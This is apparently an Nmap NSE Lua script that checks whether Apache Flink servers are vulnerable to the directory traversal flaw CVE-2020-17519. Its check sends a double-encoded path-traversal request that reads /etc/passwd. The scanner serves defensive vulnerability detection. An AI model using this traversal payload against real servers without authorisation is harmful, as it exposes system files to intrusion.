description = [[
Identifies servers vulnerable to Apache Flink Directory Traversal Vulnerability (CVE-2020-17519).
Resources
* https://github.com/B1anda0/CVE-2020-17519/blob/main/CVE-2020-17519.py
]]


---
-- @usage 
-- nmap --script apache-flink-traversal <target>
-- nmap -sV --script apache-flink-traversal <target>
--
-- @output
-- Scanned at 2021-01-06 15:55:34 UTC for 2s
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack ttl 49
-- | apache-flink-traversal: 
-- |   VULNERABLE:
-- |   Host is vulnerable to CVE-2020-17519
-- |     State: VULNERABLE
-- |       Checks if Server is vulnerable to Apache Flink CVE-2020-17519
-- |           
-- |     References:
-- |_      https://github.com/B1anda0/CVE-2020-17519
---

author = "Dolev Farhi"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "vuln"}

local http = require "http"
local vulns = require 'vulns'
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local json = require "json"

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

-- @param host Hostname
-- @param port Port number
-- @return True if response is 200 and contains root:x:0:0 in body
local function check_flink(host, port)  
    path = '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'  
  
    stdnse.debug2("Checking Apache Flink Vulnerability")

    req = http.get(host, port, path , nil , nil, nil)
    
    if req.status and req.status == 200 and string.find(req.body, "root:x:0:0") then
        return true
    else
        stdnse.debug2("Not vulnerable to CVE-2020-17519")
    end

   return false
end

---
--main
---
action = function(host, port)
  local vuln = {
    state = vulns.STATE.NOT_VULN,
    description = [[
Checks if Server is vulnerable to Apache Flink CVE-2020-17519
    ]],
    references = {
        'https://github.com/B1anda0/CVE-2020-17519'
    }
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  stdnse.debug1("CVE-2020-17519 check is in progress")
  result = check_flink(host, port)
  
  if result then
    stdnse.debug1("Host is vulnerable..")
    vuln.title = 'Host is vulnerable to CVE-2020-17519'
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)

end